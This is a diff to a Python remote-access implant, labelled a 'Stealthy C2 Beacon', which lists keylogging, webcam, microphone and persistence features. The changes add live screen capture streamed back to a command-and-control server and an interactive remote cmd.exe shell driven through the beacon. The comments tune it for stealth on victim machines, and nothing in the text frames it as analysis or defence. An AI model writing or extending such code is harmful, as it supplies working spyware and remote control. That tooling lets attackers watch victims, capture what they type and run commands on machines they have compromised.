@@ -1,4 +1,4 @@
-# implant.py - Python APT Implant 
+# implant.py - Python APT Implant (Stealthy C2 Beacon)
 # Feasibility prototype mirroring Go version capabilities
 # Features: Beaconing w/ jitter & UA rotation, AES-GCM comms, persistence,
 #           screenshot (mss), webcam (opencv), mic (pyaudio), keylogger (keyboard/pywin32),
@@ -7,6 +7,7 @@
 
 import os
 import io
+import queue
 import re
 import sys
 import uuid
@@ -27,6 +28,7 @@ import cv2
 import pyaudio
 import wave
 import keyboard
+import numpy as np
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -40,6 +42,12 @@ stream_active = False
 stream_lock = threading.Lock()
 stream_thread = None
 results_lock = threading.Lock()
+screen_streaming = False
+screen_stream_lock = threading.Lock()
+screen_stream_thread = None
+shell_process = None
+shell_output_queue = queue.Queue()
+
 
 BEACON_KEY = b"0123456789abcdef0123456789abcdef"  # 32-byte key, match server
 SLEEP_BASE = 5   # seconds
@@ -190,31 +198,6 @@ def get_camera():
     return None
     
 
-def screen_stream_worker(duration):
-    global screen_streaming
-    screen_streaming = True
-    start_time = time.time()
-    with mss.mss() as sct:
-        while screen_streaming:
-            if duration > 0 and (time.time() - start_time) > duration:
-                break
-            
-            # Capture monitor 1
-            img = sct.grab(sct.monitors[1])
-            img_bytes = mss.tools.to_png(img.rgb, img.size)
-            
-            # Convert to JPEG to save bandwidth
-            frame = cv2.imdecode(np.frombuffer(img_bytes, np.uint8), cv2.IMREAD_COLOR)
-            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
-            
-            b64_chunk = base64.b64encode(buffer).decode()
-            with results_lock:
-                pending_results.append({
-                    "task_id": "screen_live",
-                    "output": f"SCREEN_STREAM_CHUNK:{b64_chunk}"
-                })
-            time.sleep(0.5) # ~2 FPS for stability
-    screen_streaming = False
 
 # ===================== MAIN BEACON LOOP =====================
 implant_id = generate_implant_id()
@@ -308,6 +291,61 @@ def main():
         except Exception:
             pass
         time.sleep(get_jittered_sleep())
+
+# ============== SCREEN STREAM =============
+
+def screen_stream_worker(duration: int = 0):  # 0 = indefinite
+    global screen_streaming
+    with mss.mss() as sct:
+        monitor = sct.monitors[1]  # Primary full screen
+        start_time = time.time()
+        chunk_id = 0
+
+        while screen_streaming:
+            if duration > 0 and (time.time() - start_time) > duration:
+                break
+
+            img = sct.grab(monitor)
+            # Fast raw → numpy → JPEG encode (smaller than PNG for stream)
+            frame_np = np.array(img)
+            frame_bgr = cv2.cvtColor(frame_np, cv2.COLOR_BGRA2BGR)
+            _, buffer = cv2.imencode('.jpg', frame_bgr, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
+
+            b64_chunk = base64.b64encode(buffer).decode()
+            result = {
+                "task_id": f"screen_stream_chunk_{chunk_id}",
+                "output": f"SCREEN_STREAM_CHUNK:{b64_chunk}"
+            }
+            with results_lock:
+                pending_results.append(result)
+
+            chunk_id += 1
+            time.sleep(0.5)  # ~2 FPS – stealthy bandwidth, stable on low-end targets
+
+        # Send end marker
+        with results_lock:
+            pending_results.append({"task_id": "screen_stream_end", "output": "SCREEN_STREAM_END"})
+
+def start_screen_stream(duration_sec: int = 0):
+    global screen_streaming, screen_stream_thread
+    with screen_stream_lock:
+        if screen_streaming:
+            return "Already running"
+        screen_streaming = True
+        screen_stream_thread = threading.Thread(target=screen_stream_worker, args=(duration_sec,), daemon=True)
+        screen_stream_thread.start()
+        return f"Screen stream started ({'indefinite' if duration_sec == 0 else f'{duration_sec}s'})"
+
+def stop_screen_stream():
+    global screen_streaming
+    with screen_stream_lock:
+        if not screen_streaming:
+            return "Not running"
+        screen_streaming = False
+        if screen_stream_thread:
+            screen_stream_thread.join(timeout=3)
+        return "Screen stream stopped"
+
 # ===================== NEW: REVERSE WEBCAM STREAM =====================
 
 def webcam_stream_worker(duration: int):
@@ -397,9 +435,24 @@ def get_sysinfo():
         "version": platform.version(),
         "platform": platform.platform(),
         "processor": platform.processor(),
-        "cpu_count": os.cpu_local_count() if hasattr(os, 'cpu_count') else "N/A",
     }
     return json.dumps(info)
+
+def shell_worker():
+    global shell_process
+    # Start a persistent cmd.exe session
+    shell_process = subprocess.Popen(
+        ["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
+        stderr=subprocess.STDOUT, shell=True, text=True, bufsize=1
+    )
+    
+    # Reader thread to push output to a queue
+    def reader():
+        for line in iter(shell_process.stdout.readline, ""):
+            shell_output_queue.put(line)
+            
+    threading.Thread(target=reader, daemon=True).start()
+
 
 def handle_task(task):
     tid = task["task_id"]
@@ -447,6 +500,46 @@ def handle_task(task):
             elif action == "stop":
                 msg = stop_webcam_stream()
                 result["output"] = f"SWEBCAM_STREAM_STATUS:{msg}"
+        elif ttype == "screen_stream":
+            parts = cmd.split()
+            action = parts[0].lower()
+            duration = 0
+            if len(parts) > 1:
+                try:
+                    duration = int(parts[1])
+                except:
+                    duration = 0
+
+            if action == "start":
+                msg = start_screen_stream(duration)
+                result["output"] = f"SCREEN_STREAM_STATUS:{msg}"
+            elif action == "stop":
+                msg = stop_screen_stream()
+                result["output"] = f"SCREEN_STREAM_STATUS:{msg}"
+
+        elif ttype == "ishell":
+            if cmd.strip().lower() == "exit":
+                if shell_process:
+                    shell_process.terminate()
+                    shell_process = None
+                    result["output"] = "ISHELL_OUTPUT:\n[!] Shell Session Terminated.\n"
+            else:
+                if shell_process is None:
+                    shell_worker()
+                
+                shell_process.stdin.write(cmd + "\n")
+                shell_process.stdin.flush()
+                
+                # Read available output
+                output = ""
+                time.sleep(0.2) # Small delay to catch immediate response
+                try:
+                    while not shell_output_queue.empty():
+                        output += shell_output_queue.get_nowait()
+                except: pass
+                result["output"] = "ISHELL_OUTPUT:" + output
+                
+
         elif ttype == "keylog":
             if cmd == "start":
                 start_keylogger()
